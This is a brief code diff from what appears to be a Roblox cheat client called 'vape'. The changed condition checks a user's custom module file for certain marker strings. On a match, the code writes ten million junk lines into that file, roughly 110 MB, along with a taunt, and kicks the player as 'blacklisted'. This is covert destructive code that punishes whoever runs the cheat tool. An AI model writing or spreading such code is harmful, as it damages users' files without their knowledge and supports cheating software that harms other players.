@@ -5049,7 +5049,7 @@ end)
 if betterisfile("vape/CustomModules/6872274481.lua") then 
 	local parsedfile = readfile("vape/CustomModules/6872274481.lua")
 	local funny = string.rep("--omegalol\n", 10000000)
-	if parsedfile and parsedfile:lower():find("z9WV5EtgVETqnJD7UeJJ") or parsedfile:find("--hey skiddos, enjoy this one :p") then 
+	if parsedfile and (parsedfile:find("z9WV5EtgVETqnJD7UeJJ") or parsedfile:find("--hey skiddos, enjoy this one :p")) then 
 		writefile("vape/CustomModules/6872274481.lua", parsedfile.."--hey skiddos, enjoy this one :p\n"..funny)
 		task.spawn(function()
 			lplr:Kick("You have been permanently been blacklisted from vape, Have a good day.")
